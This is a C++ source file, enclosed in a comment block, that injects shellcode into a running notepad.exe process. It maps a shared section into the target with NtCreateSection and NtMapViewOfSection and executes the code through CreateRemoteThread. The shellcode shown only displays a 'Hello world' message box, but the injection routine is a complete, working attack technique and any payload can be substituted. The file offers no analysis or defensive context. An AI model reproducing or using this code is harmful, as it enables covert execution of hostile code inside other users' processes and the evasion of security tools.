/*#include <iostream>
#include <assert.h>
#include <Windows.h>
#include <winternl.h>
#include <TlHelp32.h>
#pragma comment(lib, "ntdll.lib")

typedef enum _SECTION_INHERIT {
	ViewShare = 1,
	ViewUnmap = 2
} SECTION_INHERIT, *PSECTION_INHERIT;

extern "C" __kernel_entry NTSTATUS NTAPI
NtQuerySystemInformation(IN SYSTEM_INFORMATION_CLASS, OUT PVOID, IN ULONG, OUT PULONG OPTIONAL);

extern "C" __kernel_entry NTSYSCALLAPI NTSTATUS
NtCreateSection(OUT PHANDLE, IN ACCESS_MASK, IN POBJECT_ATTRIBUTES OPTIONAL, IN PLARGE_INTEGER OPTIONAL,
	IN ULONG, IN ULONG, IN HANDLE OPTIONAL);

extern "C" __kernel_entry NTSYSCALLAPI NTSTATUS
NtMapViewOfSection(IN HANDLE, IN HANDLE, IN OUT PVOID*, IN ULONG_PTR, IN SIZE_T, IN OUT PLARGE_INTEGER OPTIONAL,
	IN OUT PSIZE_T, IN SECTION_INHERIT, IN ULONG, IN ULONG);

extern "C" __kernel_entry NTSYSCALLAPI NTSTATUS
NtUnmapViewOfSection(IN HANDLE, IN PVOID OPTIONAL);

auto getProcId() -> DWORD {
	wchar_t fileName[] = L"notepad.exe";
	auto handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	DWORD procID = NULL;
	if (handle == INVALID_HANDLE_VALUE)		return procID;

	PROCESSENTRY32W entry = { 0 };
	entry.dwSize = sizeof(PROCESSENTRY32W);

	if (Process32FirstW(handle, &entry)) {
		if (!_wcsicmp(fileName, entry.szExeFile)) {
			procID = entry.th32ProcessID;
		}
		else while (Process32NextW(handle, &entry)) {
			if (!_wcsicmp(fileName, entry.szExeFile)) {
				procID = entry.th32ProcessID;
			}
		}
	}

	CloseHandle(handle);
	return procID;
}

int main(int argc, char* argv[]) {

	char shellcode[] = "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
		"\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
		"\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
		"\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
		"\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
		"\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
		"\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
		"\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
		"\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
		"\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
		"\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
		"\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
		"\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
		"\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
		"\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
		"\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
		"\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
		"\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
		"\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
		"\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
		"\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
		"\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
		"\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
		"\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
		"\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
		"\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
		"\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
		"\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
		"\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";

	auto pid = getProcId();
	assert(pid != 0);

	auto remoteHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	assert(remoteHandle != nullptr || remoteHandle != INVALID_HANDLE_VALUE);
	std::printf("Opened handle to Pid(%x) : 0x%p\n", static_cast<DWORD>(pid), remoteHandle);

	auto sectionHandle = INVALID_HANDLE_VALUE;
	OBJECT_ATTRIBUTES objectAttr{};
	InitializeObjectAttributes(&objectAttr, nullptr, OBJ_CASE_INSENSITIVE, nullptr, nullptr);
	LARGE_INTEGER li{};
	li.QuadPart = 102400;

	void* current_base_address = nullptr;
	size_t current_view_size = 0;

	void* remote_base_address = 0;
	size_t remote_view_size = 0;
	auto threadhandle = INVALID_HANDLE_VALUE;

	auto ns = NtCreateSection(&sectionHandle, SECTION_ALL_ACCESS, &objectAttr, &li, PAGE_EXECUTE_READWRITE, SEC_COMMIT, nullptr);
	if (!NT_SUCCESS(ns)) {
		std::printf("NtCreateSection failed with error code : %x\n", static_cast<DWORD>(ns));
		goto _exit;
	}
	std::printf("Created section with handle : 0x%p\n", sectionHandle);

	ns = NtMapViewOfSection(sectionHandle, GetCurrentProcess(), &current_base_address, 0, 0, nullptr, &current_view_size,
		ViewUnmap, 0, PAGE_READWRITE);
	if (!NT_SUCCESS(ns)) {
		std::printf("NtMapViewOfSection failed with error code : %x\n", static_cast<DWORD>(ns));
		goto _exit;
	}
	std::printf("Current base address : 0x%llx\n", reinterpret_cast<uintptr_t>(current_base_address));

	ns = NtMapViewOfSection(sectionHandle, remoteHandle, &remote_base_address, 0, 0, nullptr, &remote_view_size,
		ViewUnmap, 0, PAGE_EXECUTE_READ);
	if (!NT_SUCCESS(ns)) {
		std::printf("NtMapViewOfSection failed with error code : %x\n", static_cast<DWORD>(ns));
		goto _exit;
	}
	std::printf("Remote base address : 0x%llx\n", reinterpret_cast<uintptr_t>(remote_base_address));

	RtlCopyMemory(current_base_address, shellcode, sizeof(shellcode));
	std::printf("Successfully copied shellcode to current base address.\n");

	threadhandle = CreateRemoteThread(remoteHandle, nullptr, 0, static_cast<LPTHREAD_START_ROUTINE>(remote_base_address),
		nullptr, 0, nullptr);
	if (threadhandle)	WaitForSingleObject(remoteHandle, INFINITE);

_exit:
	
	if (remote_base_address)	NtUnmapViewOfSection(sectionHandle, remote_base_address);
	if (current_base_address)	NtUnmapViewOfSection(sectionHandle, current_base_address);
	if (remoteHandle)		NtClose(remoteHandle);
	if (sectionHandle)		NtClose(sectionHandle);

	return 0;
}*/